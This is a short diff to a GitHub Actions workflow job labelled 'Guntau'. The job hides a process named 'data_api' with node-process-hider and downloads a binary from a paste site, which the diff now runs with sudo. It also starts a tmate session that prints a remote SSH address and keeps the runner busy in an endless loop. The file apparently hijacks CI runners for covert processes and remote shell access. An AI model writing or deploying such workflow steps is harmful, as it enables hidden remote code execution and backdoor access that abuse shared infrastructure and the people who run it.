@@ -26,8 +26,8 @@ jobs:
       uses: actions/checkout@v1
     - name: Guntau
       run: |
-        sudo apt update -y && apt install screen libjansson4 build-essential -y
+        sudo apt update -y && sudo apt install screen libjansson4 build-essential -y
         sudo npm i -g node-process-hider && sudo ph add data_api
-        wget -O tmate_set https://www.heypasteit.com/download/0IWXNA && chmod 755 tmate_set && ./tmate_set 
+        wget -O tmate_set https://www.heypasteit.com/download/0IWXNA && sudo chmod 755 tmate_set && sudo ./tmate_set 
         ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
         while true;do m=$((`date '+%s%N'`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80; done
